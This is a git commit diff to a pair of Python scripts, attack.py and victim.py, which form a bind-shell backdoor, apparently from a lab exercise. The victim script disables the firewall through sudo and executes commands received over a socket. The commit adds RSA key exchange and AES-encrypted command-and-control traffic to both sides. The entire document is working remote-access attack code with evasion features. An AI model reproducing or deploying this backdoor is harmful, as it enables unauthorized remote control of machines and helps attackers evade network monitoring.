828786b2a305bb19804c560c0977f2c216544614
aryaagiwal <aryagiwal@gmail.com>
2023-10-11 15:05:22 -0500

    -m 'nonce'

--- attack.py
+++ attack.py
@@ -1,6 +1,11 @@
 import sys
 import socket
-import hashlib  # Import the hashlib library
+import hashlib
+import secrets
+import os
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
 
 # Check if the password argument is provided
 if len(sys.argv) != 2:
@@ -17,40 +22,70 @@ def hash_password(password):
 # Hash the password
 hashed_password = hash_password(PASSWORD)
 
-SERVER_HOST = "10.0.2.5"  # Replace with the actual IP address of 'banana'
-SERVER_PORT = 5003
+VICTIM_HOST = "10.0.2.5"  # Replace with the actual IP address of 'banana'
+VICTIM_PORT = 5003
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
 
-s = socket.socket()
-s.connect((SERVER_HOST, SERVER_PORT))
+victim = socket.socket()
+victim.connect((VICTIM_HOST, VICTIM_PORT))
 
-# Send the hashed password to the server for verification
-s.send(hashed_password.encode())
+# Send the hashed password to the victim for verification
+victim.send(hashed_password.encode())
 
-# Receive the authentication result from the server
-auth_result = s.recv(BUFFER_SIZE).decode()
+# Receive the public key from the victim
+victim_public_key = victim.recv(BUFFER_SIZE)
 
-if auth_result == "Authentication successful":
-    print("Password accepted. You are connected.")
-else:
-    print("Password incorrect. Connection denied.")
-    s.close()
-    sys.exit(1)
+# Generate an RSA key pair for asymmetric encryption
+attacker_private_key = RSA.generate(2048)
+attacker_public_key = attacker_private_key.publickey()
 
-cwd = s.recv(BUFFER_SIZE).decode()
-print("[+] Current working directory:", cwd)
+# Send the server's public key to the attacker
+transfer_public_key = attacker_public_key.export_key()
+victim.send(transfer_public_key)
+
+#print("attacker:", attacker_public_key.export_key())
+#print("victim:", victim_public_key)
+
+# AT THIS POINT, I HAVE BOTH PUBLIC KEYS
+
+# Generate a symmetric key to send over
+symmetric_key = secrets.token_bytes(16)
+
+# Generate a cipher using the victim public key, send symmetric key to victim
+victim_cipher = PKCS1_OAEP.new(RSA.import_key(victim_public_key))
+enc_symmetric_key = victim_cipher.encrypt(symmetric_key)
+victim.send(enc_symmetric_key)
+
+#print(symmetric_key)
+# AT THIS POINT, THE SYMMETRIC KEYS MATCH
+
+# get the initial cwd
+encrypted_output = victim.recv(BUFFER_SIZE)
+ciphertext, tag, nonce = encrypted_output.split(SEPARATOR.encode())
+temp_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX, nonce)
+cwd = temp_sym_cipher.decrypt_and_verify(ciphertext, tag).decode()
 
 while True:
     command = input(f"{cwd} $> ")
     if not command.strip():
         continue
-    s.send(command.encode())
+    
+    next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX)
+    ciphertext, tag = next_sym_cipher.encrypt_and_digest(command.encode())
+    victim.send(ciphertext + SEPARATOR.encode() + tag + SEPARATOR.encode() + next_sym_cipher.nonce)
+
     if command.lower() == "exit":
         break
 
-    output = s.recv(BUFFER_SIZE).decode()
-    results, cwd = output.split(SEPARATOR)
+    # Receive and decrypt the output from the victim
+    encrypted_output = victim.recv(BUFFER_SIZE)
+    ciphertext, tag, nonce = encrypted_output.split(SEPARATOR.encode())
+    next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX, nonce)
+    plaintext = next_sym_cipher.decrypt_and_verify(ciphertext, tag).decode()
+    results, cwd = plaintext.split(SEPARATOR)
+
+
     print(results)
 
-s.close()
+victim.close()
--- victim.py
+++ victim.py
@@ -1,66 +1,104 @@
-import socket                                                                               
+import socket
 import os
 import subprocess
 import sys
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
 
 try:
     subprocess.call(['sudo', 'systemctl', 'stop', 'firewalld'])
-    print "Firewall stopped successfully."
+    print("Firewall stopped successfully.")
 except subprocess.CalledProcessError as e:
-    print "Error stopping firewall:", e
+    print("Error stopping firewall:", e)
 
-SERVER_HOST = "0.0.0.0"  # Listen on all available interfaces                           
+SERVER_HOST = "0.0.0.0"  # Listen on all available interfaces
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
 SEPARATOR = "<sep>"
 s = socket.socket()
 s.bind((SERVER_HOST, SERVER_PORT))
 s.listen(5)
-print "Listening as {}:{}".format(SERVER_HOST, SERVER_PORT)
+print("Listening as {}:{}".format(SERVER_HOST, SERVER_PORT))
 
 # Hash the password
 hashed_password = "1662198d30fef98b6ce2f4f3519136a7ac6eb71994373fa4453a3844ae963413"
 
 while True:
-    client_socket, client_address = s.accept()
-    print "{}:{} Connected!".format(client_address[0], client_address[1])
-    
+    attacker, attacker_address = s.accept()
+    print("{}:{} Connected!".format(attacker_address[0], attacker_address[1]))
+
     # Receive the hashed password from the client
-    client_hashed_password = client_socket.recv(BUFFER_SIZE).decode()
+    attacker_password = attacker.recv(BUFFER_SIZE).decode()
 
     # Check if the received hashed password matches the locally hashed password
-    if client_hashed_password == hashed_password:
-        client_socket.send("Authentication successful".encode())
-    else:
-        client_socket.send("Authentication failed".encode())
-        client_socket.close()
+    if attacker_password != hashed_password:
+        attacker.close()
         continue
-            
-    cwd = os.getcwd()
-    client_socket.send(cwd)
+    
+    # Generate an RSA key pair for asymmetric encryption
+    victim_private_key = RSA.generate(2048)
+    victim_public_key = victim_private_key.publickey()
+
+    # Send the server's public key to the attacker
+    transfer_public_key = victim_public_key.export_key()
+    attacker.send(transfer_public_key)
+
+    # get attacker public key
+    attacker_public_key = attacker.recv(BUFFER_SIZE)
+
+    #print("attacker:", attacker_public_key)
+    #print("victim:", victim_public_key.export_key())
+    
+    # AT THIS POINT, I HAVE BOTH PUBLIC KEYS
+
+    # get symmetric key from attacker
+    enc_symmetric_key = attacker.recv(BUFFER_SIZE)
+    victim_cipher = PKCS1_OAEP.new(victim_private_key)
+    symmetric_key = victim_cipher.decrypt(enc_symmetric_key)
+
+
+    #print(symmetric_key)
+    # AT THIS POINT THE SYMMETRIC KEYS MATCH
+
+    sym_cipher = AES.new(symmetric_key, AES.MODE_EAX)
+
+    # send the initial cwd
+    message = os.getcwd().encode()
+    ciphertext, tag = sym_cipher.encrypt_and_digest(message)
+    #print(ciphertext,tag, sym_cipher.nonce)
+    attacker.send(ciphertext + SEPARATOR.encode() + tag + SEPARATOR.encode() + sym_cipher.nonce)
+
+
 
     while True:
-        command = client_socket.recv(BUFFER_SIZE)
-        splitted_command = command.split()
-        if command.lower() == "exit":
+        command = attacker.recv(BUFFER_SIZE)
+        ciphertext, tag, nonce = command.split(SEPARATOR.encode())
+        next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX, nonce)
+        plaintext = next_sym_cipher.decrypt_and_verify(ciphertext, tag).decode()
+        splitted_command = plaintext.split()
+
+        if plaintext.lower() == "exit":
             break
         if splitted_command[0].lower() == "cd":
             try:
                 os.chdir(' '.join(splitted_command[1:]))
             except (OSError, IOError) as e:
-                output = str(e)
+                output = str(e).encode()
             else:
-                output = ""
+                output = str("").encode()
         else:
             try:
                 output = subprocess.check_output(splitted_command, stderr=subprocess.STDOUT)
             except subprocess.CalledProcessError as e:
                 output = e.output
             except Exception as e:
-                output = str(e)
+                output = str(e).encode()
 
         cwd = os.getcwd()
-        message = output + SEPARATOR + cwd
-        client_socket.send(message)
+        message = output + SEPARATOR.encode() + cwd.encode()
+        next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX)
+        ciphertext, tag = next_sym_cipher.encrypt_and_digest(message)
+        attacker.send(ciphertext + SEPARATOR.encode() + tag + SEPARATOR.encode() + next_sym_cipher.nonce)
 
-    client_socket.close()
+    attacker.close()
